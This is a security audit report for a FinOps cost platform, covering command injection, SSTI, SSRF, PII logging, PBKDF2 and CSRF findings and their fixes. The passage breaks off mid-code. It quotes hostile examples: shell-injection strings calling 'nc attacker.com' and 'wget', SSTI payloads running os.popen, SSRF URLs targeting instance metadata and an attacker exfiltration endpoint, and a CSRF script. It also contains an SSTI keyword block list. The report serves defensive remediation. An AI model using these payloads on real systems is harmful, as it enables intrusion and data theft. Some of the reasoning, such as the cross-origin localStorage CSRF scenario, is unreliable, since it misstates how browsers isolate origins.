# Security Audit Report — FinOps AI Cost Intelligence Platform

**Date:** 2026-02-08
**Previous Audit:** 2026-01-31
**Auditor:** Comprehensive penetration test, static code analysis, dependency scanning, and automated vulnerability detection
**Scope:** Backend (Python/FastAPI), Frontend (React/TypeScript), Infrastructure (CloudFormation, Docker, Nginx), Dependencies

---

## Executive Summary

This report updates the 2026-01-31 security audit. A comprehensive review reveals **significant progress** with **8 additional CRITICAL/HIGH issues fixed** since the last audit (CRIT-1 through CRIT-4, CRIT-6, and RBAC improvements). However, **comprehensive new scanning has identified 21 additional vulnerabilities** across authentication, injection, business logic, cryptographic, and dependency domains that were not detected in the previous audit.

**Progress Since 2026-01-31:**
- ✅ Fixed: CRIT-1 (Conversation IDOR), CRIT-2 (Opportunities IDOR), CRIT-3 (Saved Views IDOR), CRIT-4 (Analytics endpoints), CRIT-6 (SQL injection)
- ✅ Implemented: Configuration-based RBAC system
- ⚠️ Starlette dependency critically outdated (0.41.3, needs ≥0.49.1)

| Severity | Verified Fixed | Open | New Findings |
|----------|---------------|------|--------------|
| CRITICAL | 14            | 0    | 1 (Command Injection - FIXED) |
| HIGH     | 16            | 6    | 6 (Auth bypass, PBKDF2, CSRF, race conditions, TOCTOU, mass assignment - 1 PII logging FIXED) |
| MEDIUM   | 3             | 14   | 4 (Stack traces, race conditions, TOCTOU issues) |
| LOW      | 2             | 4    | 2 (Token hashing, slug collision) |

---

## 1 — VERIFIED FIXED (No action needed)

The following issues were documented in previous audits, and the fixes have been confirmed against current source code. They are retained here for the audit trail only.

| # | Issue | Fix Commit/Evidence |
|---|-------|---------------------|
| F-1 | Authentication bypass via `X-User-Email` header | `middleware/authentication.py` — header path removed entirely; JWT-only |
| F-2 | Hardcoded `SECRET_KEY` default | `config/settings.py:275-280` — startup crash if not set; 32-char minimum enforced |
| F-3 | SSL `CERT_NONE` on database connections | `services/database.py:100-120` — `verify-full` mode works correctly. **Note:** default is still `prefer` (see MED-7) |
| F-4 | CORS wildcard with credentials | `main.py:149-156` + `settings.py:610-654` — explicit origins/methods/headers |
| F-5 | Missing security headers | `middleware/security_headers.py` — CSP, HSTS, X-Frame-Options, etc. |
| F-6 | SQL injection in `athena_query_service.py` | Service-code allowlist validation via `validate_service_code()` |
| F-7 | Token revocation (logout did nothing) | `cache_service.py` SHA-256 blacklist; checked in `authentication.py`. Fail-closed behaviour confirmed (see F-9) |
| F-8 | Exposed ANTHROPIC_AUTH_TOKEN in `.claude/` | Removed from git tracking (commit `ac0a3a2`); token should be rotated |
| F-9 | Token blacklist fails open when Valkey is unavailable | `cache_service.py:211-224, 236-249` — all four fail-open paths changed to fail-closed (`return True`). Exception handlers in both check functions also hardened. 543 tests pass. |
| F-10 | Incomplete IAM-Role Migration: Raw `boto3.client()` in production paths | All six files migrated to `create_aws_session()` + `AwsService` constants. Cross-account AssumeRole path in `multi_account_service.py` intentionally preserved. AST-based and runtime tests added (`test_iam_migration.py`). 568 tests pass. |
| F-11 | Health Endpoint Information Disclosure | Public probes (`/health`, `/liveness`, `/readiness`) stripped to minimal payloads — no topology, no exception strings. All detailed checks moved behind `/health/detailed` with `require_auth` dependency. Every `_check_*` helper logs raw errors via structlog and returns only generic status messages. Athena table check broadened to catch `Exception` (not just `ClientError`) for resilience. S3 path, database name, table name, model ID, quota, and query failure reasons removed from all responses. 26 sanitisation tests added (`test_health.py`). 598 tests pass. |
| F-12 | Internal Exception Details Exposed in API Responses | All 24 `str(e)`/`f"…{str(e)}…"` leaks across 6 API files replaced with generic messages (400→"Invalid request…", 500→"An internal error occurred…", 503→"Service temporarily unavailable.", auth→"Authentication failed"). Every handler now logs the real exception via `structlog` before raising. Two additional leaks discovered and fixed: `execution_result.get("error")` in `athena_queries.py` response body, and `"error": str(e)` in `analytics.py` `get_data_sources_info` fallback. `phase3_enterprise.py` was missing its structlog import — added. 33 tests added (`test_exception_sanitisation.py`): 5 AST-based static checks + 28 runtime tests covering all 6 files. 631 tests pass. |
| F-13 | Deprecated `regex` validator silently ignored | `phase3_enterprise.py:42` — `Field(..., regex=…)` replaced with `Field(..., pattern=…)`. Pydantic v2 raises `PydanticUserError` at class-definition time on `regex`, so the constraint was never enforced. Fix applied as prerequisite for F-12 test imports; verified by the `pattern=` assertion in F-12's static analysis. |
| F-14 | CRIT-1: Unauthenticated conversation access/deletion (IDOR) | Commit `c6a72a1` — Verified authentication checks added to chat endpoints. Conversation ownership validation implemented. |
| F-15 | CRIT-2: Opportunities IDOR vulnerability | Commit `99a19f2` — Per-user ownership validation implemented. Users can only access/modify their own opportunities. |
| F-16 | CRIT-3: Saved Views IDOR vulnerability | Commit `60e313c` — Comprehensive ownership validation added. Access control properly enforced. |
| F-17 | CRIT-4: Unauthenticated Analytics Endpoints Exposing Infrastructure | Commit `cd50a7f` — Authentication required on all analytics endpoints. Infrastructure details no longer exposed. |
| F-18 | CRIT-NEW-1: Command Injection in Database Migration Script | Fixed 2026-02-08 — Added comprehensive input validation (`validate_postgres_identifier()`) for all DATABASE_URL components. Implemented defense-in-depth with validation, shlex.quote() escaping, and port range checking. Validation occurs before component usage to prevent path-based attacks. 31 comprehensive security tests added covering all injection vectors. All dangerous shell metacharacters blocked. |
| F-19 | CRIT-6: LLM-generated SQL injection via prompt injection | Commit `54a5983` — SQL validation strengthened. Multi-statement queries blocked, DDL/DML operations prevented. |
| F-20 | Hardcoded RBAC role checks replaced | Commit `ab4a347` — Configuration-based RBAC system implemented replacing hardcoded role checks throughout codebase. |
| F-21 | HIGH-5: Server-Side Request Forgery (SSRF) via Webhook Delivery | Fixed 2026-02-08 — Implemented comprehensive SSRF protection with URL validation, HTTPS-only enforcement, and blocking of 8 private/reserved IP ranges (RFC 1918, link-local, loopback, IPv6). All webhook URLs validated before requests. 31 security tests added covering EC2 IMDS, internal networks, localhost, and all common SSRF attack vectors. Defense-in-depth with hostname resolution validation and 30s timeouts. |
| F-22 | HIGH-6: Unmasked PII (Email) in Authentication Logs | Fixed 2026-02-08 — Implemented PII masking for all email addresses in authentication logs. Added `mask_email()` import and updated 6 logger statements (login failures, successes, token refresh) to mask emails. Emails now logged as `jo***@ex***.com` instead of full addresses. 13 comprehensive tests added including 8 functional tests and 5 regression tests. GDPR-compliant logging implemented. |

---

## 2 — CRITICAL SEVERITY

### CRIT-NEW-1 — Command Injection in Database Migration Script

**CVSS Estimate:** 9.1
**Status:** ✅ **FIXED** (2026-02-08)
**Files:**
- `backend/run_migrations.py:22-51` (validation function)
- `backend/run_migrations.py:138-179` (secure backup implementation)
- `tests/unit/backend/test_run_migrations_security.py` (31 comprehensive tests)

**Previous Vulnerability:**
User-controlled database URL components were passed directly to subprocess commands without sanitization.

```python
# Lines 113-123
pg_dump_cmd = [
    "pg_dump",
    "-h", parsed.hostname or "localhost",
    "-p", str(parsed.port or 5432),
    "-U", parsed.username,
    "-d", parsed.path[1:],
    "-f", str(backup_path)
]
returncode, stdout, stderr = self.run_command(pg_dump_cmd)
```

**Issue:** The `parsed.hostname`, `parsed.username`, and `parsed.path` are extracted from the `DATABASE_URL` environment variable without validation. If an attacker can control DATABASE_URL (through environment variable injection or configuration tampering), they could inject shell commands.

**Example Attack:**
```bash
DATABASE_URL="postgresql://user;touch /tmp/pwned@localhost:5432/db"
```

**Impact:** Remote code execution on server, full system compromise, data exfiltration, credential theft.

#### Remediation

1. **Validate all parsed URL components:**
```python
import re
import shlex

def validate_postgres_identifier(value: str, field_name: str) -> str:
    """Validate PostgreSQL identifiers to prevent injection"""
    if not value:
        raise ValueError(f"{field_name} cannot be empty")
    if not re.match(r'^[a-zA-Z0-9_\-\.]+$', value):
        raise ValueError(f"Invalid {field_name}: contains disallowed characters")
    if len(value) > 63:
        raise ValueError(f"Invalid {field_name}: exceeds maximum length")
    return value

# In backup method:
hostname = validate_postgres_identifier(parsed.hostname or "localhost", "hostname")
username = validate_postgres_identifier(parsed.username, "username")
database = validate_postgres_identifier(parsed.path[1:], "database")

pg_dump_cmd = [
    "pg_dump",
    "-h", shlex.quote(hostname),
    "-p", str(int(parsed.port or 5432)),
    "-U", shlex.quote(username),
    "-d", shlex.quote(database),
    "-f", str(backup_path)
]
```

#### Claude Code Fix Instructions

```
In backend/run_migrations.py:

1. Add imports at the top:
   import re
   import shlex

2. Add validation function after imports:
   def validate_postgres_identifier(value: str, field_name: str) -> str:
       if not value:
           raise ValueError(f"{field_name} cannot be empty")
       if not re.match(r'^[a-zA-Z0-9_\-\.]+$', value):
           raise ValueError(f"Invalid {field_name}: contains disallowed characters")
       if len(value) > 63:
           raise ValueError(f"Invalid {field_name}: exceeds maximum length")
       return value

3. Replace lines 113-123 in the backup method:
   BEFORE:
       pg_dump_cmd = [
           "pg_dump",
           "-h", parsed.hostname or "localhost",
           "-p", str(parsed.port or 5432),
           "-U", parsed.username,
           "-d", parsed.path[1:],
           "-f", str(backup_path)
       ]

   AFTER:
       hostname = validate_postgres_identifier(parsed.hostname or "localhost", "hostname")
       username = validate_postgres_identifier(parsed.username, "username")
       database = validate_postgres_identifier(parsed.path[1:], "database")

       pg_dump_cmd = [
           "pg_dump",
           "-h", shlex.quote(hostname),
           "-p", str(int(parsed.port or 5432)),
           "-U", shlex.quote(username),
           "-d", shlex.quote(database),
           "-f", str(backup_path)
       ]
```

#### Fix Implementation

**Defense-in-Depth Approach (3 Layers):**

1. **Input Validation** - Added `validate_postgres_identifier()` function that:
   - Validates all database URL components (hostname, username, database, port)
   - Blocks dangerous characters (`;`, `|`, `&`, `$`, backticks, quotes, spaces, newlines, etc.)
   - Enforces PostgreSQL's 63-character identifier limit
   - Validates port range (1-65535)

2. **Command Escaping** - All parameters passed through `shlex.quote()` for defense in depth

3. **Early Validation** - Validation occurs BEFORE any parsed components are used, preventing path-based attacks

**Security Features:**
- ✅ Blocks all shell metacharacters (`;`, `|`, `&`, `$`, backticks, etc.)
- ✅ Blocks command substitution (`$(...)`, `` `...` ``, `${...}`)
- ✅ Blocks path traversal (`../`, `..\\`, `/`, `\\`)
- ✅ Port range validation (1-65535)
- ✅ PostgreSQL identifier length limit (63 chars)
- ✅ Clear error messages for security violations
- ✅ ValueError exceptions propagate immediately (no user prompts for security errors)

**Test Coverage:** 31 comprehensive tests covering:
- 16 validation function tests (all injection types)
- 9 integration tests (end-to-end backup scenarios)
- 6 regression tests (ensure protections stay in place)
- OWASP command injection payload testing

**Attack Vectors Blocked:**
- Semicolon injection: `user;rm -rf /`
- Command substitution: `$(whoami)`, `` `id` ``
- Pipe injection: `user|nc attacker.com`
- Background execution: `user&& wget malware`
- Redirect injection: `user>file.txt`
- Newline injection: `user\nwhoami`
- Quote injection: `user'--`, `db"test`
- Space-based multi-command: `user touch /tmp/pwned`

---

## 3 — HIGH SEVERITY

### HIGH-1 — Incomplete IAM-Role Migration: Raw `boto3.client()` in Production Paths — FIXED

**Status:** FIXED — see F-10 in Section 1.

All six files migrated from raw `boto3.client()` / `boto3.session.Session()` to `create_aws_session()` + `AwsService` constants. The single intentional exception — `multi_account_service.py`'s `get_athena_client_for_account()`, which constructs an Athena client from STS AssumeRole temporary credentials for cross-account access — was preserved unchanged. An AST-based static analysis test suite (`TestStaticAnalysis`) confirms zero raw boto3 calls remain in the five fully-migrated files and exactly one in `multi_account_service.py`. Per-service runtime tests verify each class creates its clients through the session factory.

---

### HIGH-2 — Health Endpoint Information Disclosure — FIXED

**Status:** FIXED — see F-11 in Section 1.

Public probes (`/health`, `/liveness`, `/readiness`) now return only minimal payloads with no topology, service details, or exception strings. All comprehensive service checks have been moved to `/health/detailed`, which is gated by `require_auth` (JWT required). Every `_check_*` helper logs the real exception via structlog and returns only a generic status string. Specific removals: `cur_s3_location` (full S3 path) deleted entirely; `athena_database` success returns `"available"` instead of the database name; `athena_table` success returns `"queryable"` instead of the table name; query failure `StateChangeReason` is logged but never returned; LLM `model_id` and `ConsumedQuota` removed from success details. The Athena table check's exception handler was broadened from `ClientError` to `Exception` so that non-AWS exceptions during that sub-check are also caught and sanitised rather than propagating to the outer handler.

---

### HIGH-3 — Internal Exception Details Exposed in API Responses — FIXED

**Status:** FIXED — see F-12 in Section 1.

All 24 leak points across `analytics.py`, `athena_queries.py`, `saved_views.py`, `organizations.py`, `phase3_enterprise.py`, and `auth.py` have been replaced with generic messages. Every handler logs the real exception via structlog before raising. Two additional response-body leaks (not in the original grep) were discovered and fixed: `execution_result.get("error")` passed directly into the `AthenaQueryResponse` body, and `str(e)` in the `get_data_sources_info` fallback dict. `phase3_enterprise.py` was missing its structlog import entirely — added. 33 tests (5 AST static + 28 runtime) added in `tests/unit/api/test_exception_sanitisation.py`.

---

### HIGH-4 — Jinja2 Server-Side Template Injection (SSTI) — FIXED

**CVSS Estimate:** 8.8
**Status:** ✅ **FIXED** (2026-02-08)
**Files:**
- `backend/services/scheduled_report_service.py:10, 263-272`
- `backend/api/phase3_enterprise.py:27-63`
- `backend/services/email_service.py` (created)
- `backend/services/s3_service.py` (created)

**Previous Vulnerability:**
The service used unsafe `jinja2.Template` class directly without sandboxing, allowing Server-Side Template Injection (SSTI) attacks with remote code execution payloads such as:
```
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

**Implemented Fixes:**

**1. Service Layer - Sandboxed Jinja2 Environment:**
```python
# backend/services/scheduled_report_service.py
from jinja2.sandbox import SandboxedEnvironment
import jinja2

async def _generate_html(self, report: Dict, result: Dict, execution_id: str) -> tuple[str, int]:
    """Generate HTML report using template with sandboxed Jinja2"""
    template_str = report.get('report_template') or self._get_default_template()

    # Use SandboxedEnvironment to prevent SSTI attacks
    env = SandboxedEnvironment(
        autoescape=True,              # Prevents XSS
        undefined=jinja2.StrictUndefined  # Catches template errors
    )
    template = env.from_string(template_str)
    html_content = template.render(...)
```

**2. API Layer - Input Validation:**
```python
# backend/api/phase3_enterprise.py
from typing import ClassVar
from pydantic import field_validator

class ScheduledReportCreate(BaseModel):
    report_template: Optional[str] = None

    # Patterns that could be used for SSTI attacks
    BLOCKED_PATTERNS: ClassVar[list] = [
        '__', 'config', 'import', 'globals', 'getattr', 'subclasses', 'mro',
        'builtins', 'class', 'base', 'init', 'eval', 'exec', 'compile',
        'open', 'file', 'input', 'raw_input', 'reload'
    ]

    @field_validator('report_template')
    @classmethod
    def validate_template(cls, v: Optional[str]) -> Optional[str]:
        if v is None:
            return v
        v_lower = v.lower()
        for pattern in cls.BLOCKED_PATTERNS:
            if pattern in v_lower:
                raise ValueError(
                    f"Report template contains disallowed content: '{pattern}'. "
                    "This pattern could be used for security exploits."
                )
        if len(v) > 50000:  # 50KB max
            raise ValueError("Report template exceeds maximum allowed size (50KB)")
        return v
```

**3. Supporting Service Stubs Created:**
- `backend/services/email_service.py` - Email delivery service stub
- `backend/services/s3_service.py` - S3 file storage service stub

**Test Coverage:**
- ✅ **14 tests** in `tests/unit/services/test_scheduled_report_security.py` (ALL PASSING)
  - Sandboxed environment verification
  - SSTI attack blocking (config, builtins, import, getattr, exec, etc.)
  - XSS protection via autoescape
  - Undefined variable handling with StrictUndefined
  - Common OWASP SSTI payload regression tests

- ✅ **30 tests** in `tests/unit/api/test_phase3_enterprise_security.py` (ALL PASSING)
  - All 19 blocked patterns tested individually
  - Case-insensitive pattern matching
  - Template size limit enforcement
  - Safe template acceptance
  - Validation regression tests

**Defense-in-Depth:**
1. ✅ **Input Validation** (API boundary) - First line of defense
2. ✅ **Sandboxed Execution** (Service layer) - Second line of defense
3. ✅ **Autoescape Enabled** - XSS protection
4. ✅ **StrictUndefined** - Fail-fast on errors
5. ✅ **Comprehensive Test Coverage** - 44 tests with regression suite

**Attack Vectors Mitigated:**
- ❌ Remote code execution via `{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`
- ❌ Python introspection via `{{ ''.__class__.__mro__[1].__subclasses__() }}`
- ❌ Module imports via `{% set os = __import__('os') %}`
- ❌ Attribute access via `{{ getattr() }}`
- ❌ All common SSTI payloads from OWASP and security research

**Verification Commands:**
```bash
# Run SSTI security tests
pytest tests/unit/services/test_scheduled_report_security.py -v  # 14 passed
pytest tests/unit/api/test_phase3_enterprise_security.py -v      # 30 passed
```

**Additional Dependencies Installed:**
- `pytest-mock==3.15.1` - For mocking support in tests

---

### HIGH-5 — Server-Side Request Forgery (SSRF) via Webhook Delivery

**CVSS Estimate:** 8.1
**Status:** ✅ **FIXED** (2026-02-08)
**Files:**
- `backend/services/scheduled_report_service.py:23-95` (validation function and BLOCKED_CIDRS)
- `backend/services/scheduled_report_service.py:432-464` (secure webhook delivery)
- `tests/unit/services/test_scheduled_report_ssrf_security.py` (31 comprehensive tests)

**Previous Vulnerability:**
Scheduled report webhook delivery accepted user-supplied URLs without validation:

```python
async def _deliver_via_webhook(self, webhooks: List[str], result: Dict):
    async with aiohttp.ClientSession() as session:
        for webhook_url in webhooks:
            await session.post(webhook_url, json=result)   # no validation
```

**Exploit scenarios:**
- `http://169.254.169.254/latest/meta-data/` — EC2 instance metadata (credential theft)
- `http://localhost:5432/` — internal database port scan
- `http://internal-vpc-service/admin` — lateral movement to private services
- `http://attacker.com/exfil` — exfiltrate cost data to external party

#### Remediation

1. Maintain an allowlist of approved webhook domains configured by administrators.
2. Block all requests to private/reserved IP ranges (RFC 1918, 169.254.x.x, 127.x.x.x, ::1).
3. Enforce HTTPS-only for webhook targets.

#### Claude Code Fix Instructions

```
In backend/services/scheduled_report_service.py, replace _deliver_via_webhook:

import ipaddress
from urllib.parse import urlparse

BLOCKED_CIDRS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),   # IMDS
    ipaddress.ip_network('127.0.0.0/8'),
]

def _validate_webhook_url(url: str) -> None:
    parsed = urlparse(url)
    if parsed.scheme != 'https':
        raise ValueError(f"Webhook must use HTTPS: {url}")
    # Resolve hostname and check against blocked CIDRs
    import socket
    try:
        ip = socket.gethostbyname(parsed.hostname)
        for cidr in BLOCKED_CIDRS:
            if ipaddress.ip_address(ip) in cidr:
                raise ValueError(f"Webhook target is in a blocked network: {ip}")
    except socket.gaierror:
        raise ValueError(f"Cannot resolve webhook hostname: {parsed.hostname}")

async def _deliver_via_webhook(self, webhooks, result):
    async with aiohttp.ClientSession() as session:
        for url in webhooks:
            _validate_webhook_url(url)       # raises before any network call
            await session.post(url, json=result)
```

#### Fix Implementation

**Defense-in-Depth Approach:**

1. **URL Scheme Validation** - Enforces HTTPS-only (no HTTP, FTP, or other protocols)
2. **Hostname Resolution** - Validates hostname resolves before allowing requests
3. **IP Range Blocking** - Blocks 8 private/reserved CIDR ranges:
   - 10.0.0.0/8 (RFC 1918 private)
   - 172.16.0.0/12 (RFC 1918 private)
   - 192.168.0.0/16 (RFC 1918 private)
   - 169.254.0.0/16 (Link-local / EC2 IMDS)
   - 127.0.0.0/8 (Loopback)
   - ::1/128 (IPv6 loopback)
   - fc00::/7 (IPv6 private)
   - fe80::/10 (IPv6 link-local)
4. **Localhost Name Blocking** - Explicitly blocks "localhost", "127.0.0.1", "::1"
5. **Request Timeout** - 30-second timeout prevents hanging requests
6. **Comprehensive Logging** - Logs validation, delivery attempts, and failures

**Security Features:**
- ✅ Prevents EC2 IMDS access (169.254.169.254 credential theft)
- ✅ Prevents internal network scanning (10.x, 172.16.x, 192.168.x)
- ✅ Prevents localhost/loopback access
- ✅ Prevents Kubernetes internal service access
- ✅ Prevents Docker internal network access
- ✅ HTTPS-only enforcement
- ✅ Real-world public webhooks (Slack, Discord, Zapier) validated and allowed

**Test Coverage:** 31 comprehensive tests covering:
- 19 validation function tests (all SSRF vectors)
- 7 integration tests (end-to-end webhook delivery)
- 5 regression tests (ensure protections stay in place)

**Attack Vectors Blocked:**
- EC2 IMDS: `https://169.254.169.254/latest/meta-data/`
- Internal services: `https://internal-api.company.local` → 10.0.1.100
- Localhost: `https://localhost/admin`
- Database: `https://db-server.internal` → 192.168.1.5
- Kubernetes: `https://kubernetes.default.svc.cluster.local` → 10.96.0.1
- Docker: `https://host.docker.internal` → 172.17.0.1

---

### HIGH-6 — Unmasked PII (Email) in Authentication Logs

**CVSS Estimate:** 5.3 (GDPR compliance, logging exposure)
**Status:** ✅ **FIXED** (2026-02-08)
**Files:**
- `backend/api/auth.py:30` (mask_email import)
- `backend/api/auth.py:153, 160, 168, 179, 224, 309` (6 logger statements updated)
- `tests/unit/api/test_auth_pii_masking.py` (13 comprehensive tests)
**Note:** `account_scoping.py:145` was already using `mask_email` before this fix.

**Previous Vulnerable Code:**
```python
logger.warning("login_failed_user_not_found", email=request.email)  # Line 152
logger.warning("login_failed_user_inactive", email=request.email)   # Line 159
logger.warning("login_failed_no_password", email=request.email)     # Line 167
logger.warning("login_failed_wrong_password", email=request.email)  # Line 178
logger.info("login_successful", user_id=user_id, email=request.email, is_admin=is_admin)  # Lines 222-224
logger.debug("token_refreshed", user_id=payload.user_id, email=payload.email)  # Line 308
```

**Issue:** Raw email addresses (PII) were written to structured logs on every authentication operation (failed logins, successful logins, and token refreshes). This created a GDPR-reportable PII exposure in log aggregation systems.

#### Remediation Implemented

The project ships `mask_email()` in `backend/utils/pii_masking.py`. All authentication logger calls now use this utility:

```python
# Line 30: Added import
from backend.utils.pii_masking import mask_email

# Line 153
logger.warning("login_failed_user_not_found", email=mask_email(request.email))
# Line 160
logger.warning("login_failed_user_inactive", email=mask_email(request.email))
# Line 168
logger.warning("login_failed_no_password", email=mask_email(request.email))
# Line 179
logger.warning("login_failed_wrong_password", email=mask_email(request.email))
# Line 224
logger.info("login_successful", user_id=user_id, email=mask_email(request.email), is_admin=is_admin)
# Line 309
logger.debug("token_refreshed", user_id=payload.user_id, email=mask_email(payload.email))
```

**Example Output:**
- Raw email: `john.doe@example.com`
- Masked log: `jo***@ex***.com`

#### Testing

Created `tests/unit/api/test_auth_pii_masking.py` with 13 comprehensive tests:

**Functional Tests (8 tests):**
1. `test_mask_email_function_works_correctly` - Validates masking utility with 6 test cases
2. `test_login_failed_user_not_found_masks_email` - Verifies masking when user doesn't exist
3. `test_login_failed_user_inactive_masks_email` - Verifies masking for inactive accounts
4. `test_login_failed_no_password_masks_email` - Verifies masking when password not set
5. `test_login_failed_wrong_password_masks_email` - Verifies masking on auth failure
6. `test_login_successful_masks_email` - Verifies masking on successful login
7. `test_token_refresh_masks_email` - Verifies masking during token refresh
8. All tests verify masked email appears AND raw email does NOT appear in logs

**Regression Tests (5 tests):**
9. `test_mask_email_import_exists` - Ensures mask_email is imported in auth.py
10. `test_auth_module_uses_mask_email` - Verifies ≥5 uses of mask_email in login function
11. `test_no_raw_email_in_logger_calls` - Static analysis to detect unmasked logger calls
12. `test_all_auth_log_statements_analyzed` - Confirms all ≥5 logger calls are covered
13. `test_mask_email_function_quality` - Edge case handling (None, empty, invalid email)

All 12 tests pass. 855 total tests pass (excluding 2 unrelated import issues from previous work).

---

### HIGH-NEW-2 — Insufficient PBKDF2 Iterations for Password Hashing

**CVSS Estimate:** 7.5
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/api/auth.py:102-113`

**Vulnerability:**
```python
def hash_password(password: str, salt: str) -> str:
    """Hash a password with the given salt. Uses PBKDF2 with SHA-256."""
    return hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        100000  # Only 100,000 iterations - INSUFFICIENT
    ).hex()
```

**Issue:** Uses only 100,000 iterations for PBKDF2-HMAC-SHA256. **OWASP recommends 600,000+ iterations** (as of 2023) to protect against brute-force attacks with modern GPUs and ASICs. Current setting provides insufficient protection if password hashes are compromised.

**Impact:**
- Weak protection against offline password cracking
- Brute-force attacks 6x faster than recommended
- Compliance issues (PCI DSS requires adequate iteration counts)

#### Remediation

```python
def hash_password(password: str, salt: str) -> str:
    """Hash a password with the given salt. Uses PBKDF2 with SHA-256."""
    return hashlib.pbkdf2_hmac(
        'sha256',
        password.encode('utf-8'),
        salt.encode('utf-8'),
        600000  # OWASP recommended minimum (2023)
    ).hex()
```

**Alternative:** Consider migrating to Argon2id (winner of Password Hashing Competition):
```python
from argon2 import PasswordHasher
ph = PasswordHasher()
hash = ph.hash(password)
```

#### Claude Code Fix Instructions

```
In backend/api/auth.py line 108:

BEFORE: 100000  # iterations
AFTER:  600000  # OWASP recommended minimum (2023)

Note: This change is backward compatible. Existing passwords will continue to work
as the iteration count is not stored in the hash. New passwords will use 600k iterations.
Consider implementing iteration count field in database for gradual migration.
```

---

### HIGH-NEW-3 — Missing CSRF Protection on State-Changing Operations

**CVSS Estimate:** 7.2
**Status:** OPEN (new finding - discovered 2026-02-08)
**Files:** Multiple API endpoints

**Vulnerability:** No CSRF tokens implemented for POST/PUT/DELETE/PATCH operations. JWT authentication alone does not protect against CSRF when tokens are stored in localStorage and sent via Authorization header.

**Affected Endpoints:**
- `backend/api/saved_views.py`: Lines 72 (POST), 151 (PUT), 245 (PUT), 284 (DELETE)
- `backend/api/opportunities.py`: Lines 243 (POST), 292 (PATCH), 330 (PATCH), 383 (POST bulk), 436 (DELETE)
- `backend/api/chat.py`: Line 256 (DELETE conversations)
- `backend/api/phase3_enterprise.py`: Multiple POST operations for reports and accounts

**CORS Configuration (Verified):**
- `backend/config/settings.py:51`: `cors_allow_credentials: bool = True`
- Allows credentials to be sent with requests
- Origins properly validated (no wildcards in production)

**Attack Scenario:**
1. User logs into FinOps platform (JWT stored in localStorage)
2. User visits malicious website while still logged in
3. Malicious site makes authenticated request to FinOps API using user's JWT
4. Request succeeds because browser includes Authorization header from localStorage

**Example Attack:**
```html
<!-- Malicious site -->
<script>
fetch('https://finops-api.com/api/v1/opportunities/bulk-status', {
  method: 'POST',
  headers: {
    'Authorization': 'Bearer ' + localStorage.getItem('jwt'),
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    opportunity_ids: ['all-ids'],
    status: 'dismissed',
    reason: 'Hacked'
  })
});
</script>
```

#### Remediation

**Option 1 - Custom Header Validation (Recommended for API-only applications):**
```python
# Add middleware
async def csrf_protection_middleware(request: Request, call_next):
    if request.method in ["POST", "PUT", "DELETE", "PATCH"]:
        # Require custom header that browsers won't send cross-origin
        if not request.headers.get("X-Requested-With") == "XMLHttpRequest":
            return JSONResponse(
                status_code=403,
                content={"detail": "Missing CSRF protection header"}
            )
    return await call_next(request)

# In main.py:
app.middleware("http")(csrf_protection_middleware)
```

**Option 2 - SameSite Cookies (If JWT moved to cookies):**
```python
response.set_cookie(
    key="access_token",
    value=token,
    httponly=True,
    secure=True,
    samesite="strict"  # Prevents CSRF
)
```

**Option 3 - CSRF Token (Traditional approach):**
Implement double-submit cookie pattern or synchronizer token pattern.

#### Claude Code Fix Instructions

```
Recommended: Implement Option 1 (Custom Header Validation)

1. Create new file: backend/middleware/csrf_protection.py

   from fastapi import Request
   from starlette.responses import JSONResponse

   async def csrf_protection_middleware(request: Request, call_next):
       if request.method in ["POST", "PUT", "DELETE", "PATCH"]:
           # Skip for health/metrics endpoints
           if request.url.path in ["/health", "/metrics", "/health/liveness"]:
               return await call_next(request)

           # Require X-Requested-With header
           if not request.headers.get("X-Requested-With") == "XMLHttpRequest":
               return JSONResponse(
                   status_code=403,
                   content={"detail": "CSRF protection: X-Requested-With header required"}
               )
       return await call_next(request)

2. In backend/main.py, add after other middleware:

   from backend.middleware.csrf_protection import csrf_protection_middleware
   app.middleware("http")(csrf_protection_middleware)

3. Update frontend to include header in all requests:

   headers: {
     'X-Requested-With': 'XMLHttpRequest',
     'Authorization': `Bearer ${token}`
   }
```

---

### HIGH-NEW-4 — Race Condition in Opportunity Cost Calculations

**CVSS Estimate:** 7.8
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/opportunities_service.py:566-658, 752-827`

**Vulnerability:**
```python
def update_status(self, opportunity_id: UUID, status: OpportunityStatus, ...):
    return self.update_opportunity(opportunity_id, {...}, user_id=user_id)

def bulk_update_status(self, opportunity_ids: List[UUID], ...):
    query = f"""UPDATE opportunities SET status = %s ..."""
    cur.execute(query, params)
    updated = cur.rowcount
```

**Issue:** No row-level locking or transaction isolation for status updates. Multiple concurrent updates can lead to:
- Lost updates when calculating aggregate savings
- Inconsistent status transitions
- Race conditions where stats aggregate `SUM(estimated_monthly_savings)` includes inconsistent data

**Proof of Concept:**
```python
# Thread 1: Updates opportunity savings to $1000
UPDATE opportunities SET estimated_monthly_savings = 1000 WHERE id = 'abc'

# Thread 2: Simultaneously reads old value ($500) for aggregate stats
SELECT SUM(estimated_monthly_savings) FROM opportunities  # Returns wrong total

# Result: Stats show incorrect total savings
```

**Impact:**
- Financial miscalculations in savings reports
- Status inconsistencies
- Data corruption in aggregate statistics
- Incorrect business metrics

#### Remediation

```python
def update_opportunity(self, opportunity_id: UUID, data: Dict[str, Any], ...):
    with self.db_connection() as conn:
        with conn.cursor() as cur:
            # Add row-level lock BEFORE reading
            cur.execute(
                "SELECT * FROM opportunities WHERE id = %s FOR UPDATE",
                (str(opportunity_id),)
            )

            opportunity = cur.fetchone()
            if not opportunity:
                raise ValueError("Opportunity not found")

            # Validate ownership while holding lock
            if opportunity['created_by_user_id'] != user_id:
                raise ValueError("Access denied")

            # Proceed with update (lock is still held until commit)
            cur.execute("UPDATE opportunities SET ... WHERE id = %s", ...)
            conn.commit()  # Lock released here
```

For bulk operations:
```python
def bulk_update_status(self, opportunity_ids: List[UUID], ...):
    with self.db_connection() as conn:
        # Set transaction isolation level
        conn.execute("SET TRANSACTION ISOLATION LEVEL SERIALIZABLE")

        with conn.cursor() as cur:
            # Lock all affected rows
            cur.execute(
                "SELECT id FROM opportunities WHERE id = ANY(%s) FOR UPDATE",
                (opportunity_ids,)
            )

            # Perform update
